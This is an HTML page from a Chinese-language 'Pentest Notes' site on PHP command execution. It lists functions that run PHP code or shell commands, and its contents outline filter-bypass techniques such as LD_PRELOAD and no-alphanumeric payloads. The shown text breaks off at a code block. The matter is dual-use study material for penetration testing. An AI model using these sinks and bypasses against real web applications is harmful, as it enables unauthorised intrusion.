<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="PHP 命令执行 # 执行 PHP 代码函数 # eval(phpcode): 反序列化中无法使用，因为 php eval 是一个语言结构，和 echo 一样不属于函数，同理就算通过配置 disable_functions 也是禁用不了 eval 函数的
assert(phpcode): php7 以前，因为 php7 中禁止了动态调用 assert。直接将传入的参数当成 PHP 代码执行，不需要以分号结尾（特别注意），有时加上分号不会显示结果
call_user_func(&quot;assert&quot;,phpcode)：传入的参数作为 assert 函数的参数
执行系统命令函数 # system() # system(string $command, int &amp;$return_var): string
command: 要执行的命令
有回显 exec() # exec(string $command, array &amp;$output = null, int &amp;$return_var = null): string
command: 要执行的命令
output: 命令执行后的输出，每行一个元素，如果不设置，默认输出最后一行
可以用 print_r() 打印数组
passthru() # passthru(string $command, int &amp;$return_var): void
command: 要执行的命令">
<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
  <meta property="og:site_name" content="Pentest Notes">
  <meta property="og:title" content="Pentest Notes">
  <meta property="og:description" content="PHP 命令执行 # 执行 PHP 代码函数 # eval(phpcode): 反序列化中无法使用，因为 php eval 是一个语言结构，和 echo 一样不属于函数，同理就算通过配置 disable_functions 也是禁用不了 eval 函数的
assert(phpcode): php7 以前，因为 php7 中禁止了动态调用 assert。直接将传入的参数当成 PHP 代码执行，不需要以分号结尾（特别注意），有时加上分号不会显示结果
call_user_func(&amp;quot;assert&amp;quot;,phpcode)：传入的参数作为 assert 函数的参数
执行系统命令函数 # system() # system(string $command, int &amp;amp;$return_var): string
command: 要执行的命令
有回显 exec() # exec(string $command, array &amp;amp;$output = null, int &amp;amp;$return_var = null): string
command: 要执行的命令
output: 命令执行后的输出，每行一个元素，如果不设置，默认输出最后一行
可以用 print_r() 打印数组
passthru() # passthru(string $command, int &amp;amp;$return_var): void
command: 要执行的命令">
  <meta property="og:locale" content="zh-cn">
  <meta property="og:type" content="article">
  <meta property="article:section" content="docs">
<title>Php命令执行 | Pentest Notes</title>
<link rel="manifest" href="/manifest.json">
<link rel="icon" href="/favicon.png" >
<link rel="canonical" href="http://localhost:1313/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
<link rel="stylesheet" href="/book.min.599079e474050c6bea85d1008bc631728c5ad956088cb0958f2056ed345f0196.css" integrity="sha256-WZB55HQFDGvqhdEAi8Yxcoxa2VYIjLCVjyBW7TRfAZY=" crossorigin="anonymous">
  <script defer src="/flexsearch.min.js"></script>
  <script defer src="/en.search.min.be3cb6062ad734487c8dd12d9a0644f0e72a4160ed8d460fa6f4cbb2c2b005a6.js" integrity="sha256-vjy2BirXNEh8jdEtmgZE8OcqQWDtjUYPpvTLssKwBaY=" crossorigin="anonymous"></script>

  

<!--
Made with Book Theme
https://github.com/alex-shpak/hugo-book
-->
  
</head>
<body dir="ltr">
  <input type="checkbox" class="hidden toggle" id="menu-control" />
  <input type="checkbox" class="hidden toggle" id="toc-control" />
  <main class="container flex">
    <aside class="book-menu">
      <div class="book-menu-content">
        
  <nav>
<h2 class="book-brand">
  <a class="flex align-center" href="/"><span>Pentest Notes</span>
  </a>
</h2>


<div class="book-search">
  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
  <div class="book-search-spinner hidden"></div>
  <ul id="book-search-results"></ul>
</div>












  



  
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Amass/" class="">Amass</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Linux%E5%86%85%E9%83%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="">Linux内部信息收集</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F/" class="">主机扫描</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%89%AB%E6%8F%8F/" class="">子域名扫描</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/" class="">定时任务</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F/" class="">目录扫描</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%85%B6%E4%BB%96/Hooking/1.%E7%94%A8%E6%88%B7%E6%80%81Hooking%E4%BB%8B%E7%BB%8D/" class="">1.用户态 Hooking介绍</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%85%B6%E4%BB%96/Hooking/2.%E7%BB%95%E8%BF%87%E7%94%A8%E6%88%B7%E6%80%81Hooking/" class="">2.绕过用户态 Hooking</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%85%B6%E4%BB%96/Hooking/3.%E8%B0%83%E7%94%A8syscall%E5%AE%9E%E7%8E%B0%E7%94%A8%E6%88%B7%E6%80%81Hook%E7%BB%95%E8%BF%87/" class="">3.调用syscall实现用户态 Hook绕过</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%85%B6%E4%BB%96/HVV%E9%9D%A2%E8%AF%95/" class="">Hvv面试</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%85%B6%E4%BB%96/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/" class="">解决ubuntu Crontab反弹shell失败的问题</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/ADSEC101/" class="">Adsec101</a>
  

        </li>
      
    
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/Kerbrute/" class="">Kerbrute</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/KeyTab/" class="">Key Tab</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/runas/" class="">Runas</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/Windows%E5%86%85%E9%83%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="">Windows内部信息收集</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/%E5%B1%80%E5%9F%9F%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="">局域网信息收集</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/IPC/" class="">IP C</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99/" class="">相关资料</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/" class="">代理转发</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/" class="">容器逃逸</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%AF%86%E7%A0%81%E6%94%B6%E9%9B%86/" class="">密码收集</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/" class="">扫描工具</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/" class="">文件传输</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%9B%B8%E5%85%B3%E6%96%87%E7%AB%A0/" class="">相关文章</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/CS%E9%9A%90%E5%8C%BF/CobaltStrike&#43;CDN/" class="">Cobalt Strike Cdn</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E5%85%8D%E6%9D%80/PHP%E5%86%85%E5%AD%98%E9%A9%AC/" class="">Php内存马</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E5%85%8D%E6%9D%80/WebShell%E5%85%8D%E6%9D%80/" class="">Web Shell免杀</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E5%85%8D%E6%9D%80/%E5%85%8D%E6%9D%80/" class="">免杀</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/" class="">Linux提权</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E6%8F%90%E6%9D%83/MySQL%E6%8F%90%E6%9D%83/" class="">My Sql提权</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E6%8F%90%E6%9D%83/SQLServer%E6%8F%90%E6%9D%83/" class="">SQL Server提权</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E8%BF%9C%E6%8E%A7/%E4%BC%98%E5%8C%96shell/" class="">优化shell</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/Java/Fastjson/" class="">Fastjson</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/Java/Shiro/" class="">Shiro</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/pear&#43;register_argc_argv%E5%88%A9%E7%94%A8/" class="">Pear Register Argc Argv利用</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="">Php伪协议</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/PHP%E5%86%85%E7%BD%AE%E7%B1%BB/" class="">Php内置类</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="">Php反序列化漏洞</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="active">Php命令执行</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/PHP%E5%9F%BA%E7%A1%80/" class="">Php基础</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/PHP%E7%89%B9%E6%80%A7%E5%A4%A7%E5%85%A8%E4%B8%8D%E5%AE%8C%E6%95%B4/" class="">Php特性大全（不完整</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/%E6%97%A0%E5%8F%82%E6%95%B0RCE/" class="">无参数 Rce</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/SSRF/" class="">Ssrf</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/SSTI/PHP-Twig/" class="">Php Twig</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/SSTI/SSTI/" class="">Ssti</a>
  

        </li>
      
    
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/WordPress/" class="">Word Press</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="">信息泄露</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/" class="">命令执行绕过</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/NoSQLi/" class="">No Sqli</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/SQLi/" class="">Sqli</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/SQLi%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/" class="">Sqli过滤绕过</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/sqlmap%E8%84%9A%E6%9C%AC/" class="">Sqlmap脚本</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/%E5%90%84%E7%89%88%E6%9C%AC%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%AD%E5%8F%A5/" class="">各版本数据库语句</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/HTTP_content-type_%E5%AF%B9%E7%85%A7%E8%A1%A8/" class="">HTTP Content Type 对照表</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="">文件上传</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1/" class="">日志审计</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/motd/" class="">Motd</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/MySQL/" class="">My SQL</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/Redis/" class="">Redis</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/smb/" class="">Smb</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/VNC/" class="">Vnc</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/webdav/" class="">Webdav</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/3.FUZZ/FUZZ/" class="">Fuzz</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/3.FUZZ/%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7/" class="">爆破工具</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/4.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E5%AE%A1%E8%AE%A1/CodeQL-Java/" class="">Code Ql Java</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/4.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E5%AE%A1%E8%AE%A1/SQL%E6%B3%A8%E5%85%A5/" class="">Sql注入</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/4.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP%E5%AE%A1%E8%AE%A1/SQL%E6%B3%A8%E5%85%A5/" class="">Sql注入</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/4.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%B7%A5%E5%85%B7/" class="">工具</a>
  

        </li>
      
    
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/5.%E6%BC%8F%E6%89%AB%E5%B7%A5%E5%85%B7/searchsploit/" class="">Searchsploit</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E7%BA%A2%E9%98%9F%E8%A1%8C%E5%8A%A8/%E7%BA%A2%E9%98%9F%E9%9D%A2%E8%AF%95/" class="">红队面试</a>
  

        </li>
      
    
  </ul>















</nav>




  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>


 
      </div>
    </aside>

    <div class="book-page">
      <header class="book-header">
        
  <div class="flex align-center justify-between">
  <label for="menu-control">
    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
  </label>

  <strong>Php命令执行</strong>

  <label for="toc-control">
    
    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
    
  </label>
</div>


  
  <aside class="hidden clearfix">
    
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#执行-php-代码函数">执行 PHP 代码函数</a></li>
    <li><a href="#执行系统命令函数">执行系统命令函数</a>
      <ul>
        <li><a href="#system">system()</a></li>
        <li><a href="#exec">exec()</a></li>
        <li><a href="#passthru">passthru()</a></li>
        <li><a href="#shell_exec">shell_exec()</a></li>
        <li><a href="#-反引号">` 反引号</a></li>
        <li><a href="#popen">popen()</a></li>
        <li><a href="#proc_open">proc_open()</a></li>
        <li><a href="#pcntl_exec">pcntl_exec()</a></li>
      </ul>
    </li>
    <li><a href="#ld_preload-绕过">LD_PRELOAD 绕过</a>
      <ul>
        <li><a href="#程序的链接">程序的链接</a></li>
        <li><a href="#ld_preload">LD_PRELOAD</a></li>
        <li><a href="#绕过条件">绕过条件</a></li>
        <li><a href="#可利用函数">可利用函数</a></li>
        <li><a href="#蚁剑绕过">蚁剑绕过</a></li>
      </ul>
    </li>
    <li><a href="#操作系统连接符">操作系统连接符</a>
      <ul>
        <li><a href="#linux">Linux</a></li>
        <li><a href="#windows">Windows</a></li>
      </ul>
    </li>
    <li><a href="#空格过滤绕过">空格过滤绕过</a>
      <ul>
        <li><a href="#ifs-代替空格内部字段分隔符">$IFS 代替空格（内部字段分隔符）</a></li>
        <li><a href="#大括号">大括号</a></li>
        <li><a href="#重定向字符">重定向字符</a></li>
        <li><a href="#09tab">%09（Tab）</a></li>
      </ul>
    </li>
    <li><a href="#文件名过滤绕过">文件名过滤绕过</a>
      <ul>
        <li><a href="#通配符">通配符</a></li>
        <li><a href="#单双引号绕过">单双引号绕过</a></li>
        <li><a href="#反斜杠绕过">反斜杠绕过</a></li>
        <li><a href="#特殊变量">特殊变量</a></li>
        <li><a href="#内联执行拼接">内联执行（$拼接）</a></li>
        <li><a href="#利用-linux-中的环境变量">利用 linux 中的环境变量</a></li>
      </ul>
    </li>
    <li><a href="#常见文件读取命令绕过">常见文件读取命令绕过</a></li>
    <li><a href="#编码绕过">编码绕过</a>
      <ul>
        <li><a href="#base64">base64</a></li>
        <li><a href="#base32">base32</a></li>
        <li><a href="#base58">base58</a></li>
        <li><a href="#hex-编码">HEX 编码</a></li>
        <li><a href="#shellcode">shellcode</a></li>
      </ul>
    </li>
    <li><a href="#无回显时间盲注">无回显时间盲注</a></li>
    <li><a href="#长度过滤绕过">长度过滤绕过</a>
      <ul>
        <li><a href="#相关命令">相关命令</a></li>
        <li><a href="#组合运用">组合运用</a></li>
        <li><a href="#长度限制为-5-的绕过">长度限制为 5 的绕过</a></li>
        <li><a href="#长度限制为-4-的绕过">长度限制为 4 的绕过</a></li>
      </ul>
    </li>
    <li><a href="#无参数">无参数</a>
      <ul>
        <li><a href="#常见函数解释">常见函数解释</a></li>
      </ul>
    </li>
    <li><a href="#无参数命令执行请求头绕过">无参数命令执行请求头绕过</a>
      <ul>
        <li><a href="#请求头-rce">请求头 RCE</a></li>
      </ul>
    </li>
    <li><a href="#无字母数字绕过">无字母数字绕过</a>
      <ul>
        <li><a href="#异或运算绕过">异或运算绕过</a></li>
        <li><a href="#或运算绕过">或运算绕过</a></li>
        <li><a href="#取反绕过">取反绕过</a></li>
        <li><a href="#自增绕过">自增绕过</a></li>
        <li><a href="#上传临时文件绕过">上传临时文件绕过</a></li>
      </ul>
    </li>
  </ul>
</nav>



  </aside>
  
 
      </header>

      
      
  <article class="markdown book-article"><h1 id="php-命令执行">
  PHP 命令执行
  <a class="anchor" href="#php-%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c">#</a>
</h1>
<h2 id="执行-php-代码函数">
  执行 PHP 代码函数
  <a class="anchor" href="#%e6%89%a7%e8%a1%8c-php-%e4%bb%a3%e7%a0%81%e5%87%bd%e6%95%b0">#</a>
</h2>
<ul>
<li>
<p><code>eval(phpcode)</code>: 反序列化中无法使用，因为 php eval 是一个语言结构，和 echo 一样不属于函数，同理就算通过配置 disable_functions 也是禁用不了 eval 函数的</p>
</li>
<li>
<p><code>assert(phpcode)</code>: php7 以前，因为 php7 中禁止了动态调用 assert。直接将传入的参数当成 PHP 代码执行，不需要以分号结尾（特别注意），有时加上分号不会显示结果</p>
</li>
<li>
<p><code>call_user_func(&quot;assert&quot;,phpcode)</code>：传入的参数作为 assert 函数的参数</p>
</li>
</ul>
<h2 id="执行系统命令函数">
  执行系统命令函数
  <a class="anchor" href="#%e6%89%a7%e8%a1%8c%e7%b3%bb%e7%bb%9f%e5%91%bd%e4%bb%a4%e5%87%bd%e6%95%b0">#</a>
</h2>
<h3 id="system">
  system()
  <a class="anchor" href="#system">#</a>
</h3>
<p><code>system(string $command, int &amp;$return_var): string</code></p>
<p>command: 要执行的命令</p>
<ul>
<li>有回显</li>
</ul>
<h3 id="exec">
  exec()
  <a class="anchor" href="#exec">#</a>
</h3>
<p><code>exec(string $command, array &amp;$output = null, int &amp;$return_var = null): string</code></p>
<p>command: 要执行的命令</p>
<p>output: 命令执行后的输出，每行一个元素，如果不设置，默认输出最后一行</p>
<p>可以用 print_r() 打印数组</p>
<h3 id="passthru">
  passthru()
  <a class="anchor" href="#passthru">#</a>
</h3>
<p><code>passthru(string $command, int &amp;$return_var): void</code></p>
<p>command: 要执行的命令</p>
<p>输出二进制数据，需要直接传输到浏览器</p>
<h3 id="shell_exec">
  shell_exec()
  <a class="anchor" href="#shell_exec">#</a>
</h3>
<p><code>shell_exec(string $cmd): string</code></p>
<ul>
<li>无回显，借助 echo、print 等函数输出： echo shell_exec(&rsquo;ls&rsquo;);</li>
</ul>
<h3 id="-反引号">
  ` 反引号
  <a class="anchor" href="#-%e5%8f%8d%e5%bc%95%e5%8f%b7">#</a>
</h3>
<p><code>command</code>: 要执行的命令</p>
<ul>
<li>无回显，借助 echo、print 等函数输出： echo <code>ls</code>;</li>
</ul>
<h3 id="popen">
  popen()
  <a class="anchor" href="#popen">#</a>
</h3>
<p><code>popen(string $command, string $mode): resource</code></p>
<p>command: 要执行的命令</p>
<p>mode: 打开文件的模式，r 或 w</p>
<p>使用 fgets() 或 fread() 读取文件内容，再用 echo、print_r() 打印</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
